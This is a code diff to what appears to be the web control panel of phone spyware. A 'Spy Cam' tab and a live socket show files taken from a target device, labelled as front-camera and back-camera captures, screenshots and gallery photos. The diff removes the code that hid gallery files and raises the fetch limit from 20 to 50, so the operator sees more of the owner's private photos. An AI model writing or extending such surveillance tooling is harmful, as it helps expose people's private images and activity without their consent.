@@ -110,11 +110,10 @@
             justify-content: center;
         }
         
-        /* 🔥 CHANGE HERE: 'contain' dikhayega puri photo */
         .img-card img { 
             width: 100%; 
             height: 100%; 
-            object-fit: contain; /* ✅ AB PURI PHOTO DIKHEGI */
+            object-fit: contain; 
             background-color: #000;
             transition: transform 0.3s;
         }
@@ -188,7 +187,7 @@
             <i class="fa-solid fa-eye"></i> Spy Cam
         </button>
         <button class="tab-btn" data-target="screen" onclick="switchTab('screen')">
-            <i class="fa-solid fa-mobile-screen"></i> Screen Only
+            <i class="fa-solid fa-mobile-screen"></i> Gallery/Screen
         </button>
     </div>
 
@@ -265,7 +264,8 @@
             isLoading = true;
             if (!isBackground) loadingSpinner.style.display = 'block';
 
-            let url = `${API_BASE}/api/gallery-list/${DEVICE_ID}?limit=20`;
+            // ✅ CHANGED LIMIT TO 50
+            let url = `${API_BASE}/api/gallery-list/${DEVICE_ID}?limit=50`;
             if (nextCursor && !isReset) url += `&next_cursor=${nextCursor}`;
 
             fetch(url)
@@ -309,7 +309,7 @@
         }
 
         // ==========================================
-        //  3. FILTER & RENDER (UPDATED: NO GALLERY)
+        //  3. FILTER & RENDER (✅ FIXED: GALLERY NOW VISIBLE)
         // ==========================================
         function switchTab(category) {
             currentFilter = category;
@@ -326,11 +326,6 @@
             const filtered = allFilesData.filter(url => {
                 const lowerUrl = url.toLowerCase();
 
-                // 🛑 BLOCK GALLERY FOLDER
-                if (lowerUrl.includes('gallery')) {
-                    return false;
-                }
-
                 // 🔍 IDENTIFY CAMERA
                 const isCamera = lowerUrl.includes('front') || 
                                  lowerUrl.includes('back') || 
@@ -339,7 +334,7 @@
                 if (currentFilter === 'camera') {
                     return isCamera; // Only Camera
                 } else {
-                    return !isCamera; // Only Screen (Everything else)
+                    return !isCamera; // ✅ SCREEN + GALLERY (Jo camera nahi hai)
                 }
             });
 
@@ -357,10 +352,11 @@
                 div.className = 'img-card';
                 div.onclick = () => openModal(url);
 
-                let badgeText = "Screen Capture"; 
+                let badgeText = "File"; 
                 if(url.includes('front')) badgeText = "Front Cam";
                 else if(url.includes('back')) badgeText = "Back Cam";
                 else if(url.includes('screen') || url.includes('shot')) badgeText = "Screen Shot";
+                else if(url.includes('gallery')) badgeText = "Gallery File"; // ✅ Added Label
 
                 div.innerHTML = `
                     <img src="${url}" loading="lazy" onerror="this.style.display='none'">
@@ -371,7 +367,7 @@
         }
 
         // ==========================================
-        //  4. REAL-TIME SOCKET
+        //  4. REAL-TIME SOCKET (✅ FIXED: NO BLOCKING)
         // ==========================================
         function setupSocket() {
             socket.on('new-file', (data) => {
@@ -384,8 +380,7 @@
                     
                     let urlLower = data.url.toLowerCase();
                     
-                    // 🛑 SOCKET SE BHI GALLERY KO ROK DO
-                    if (urlLower.includes('gallery')) return;
+                    // ✅ Maine wo line hata di jo gallery ko rok rahi thi.
 
                     let isCam = urlLower.includes('cam') || urlLower.includes('front') || urlLower.includes('back');
                     
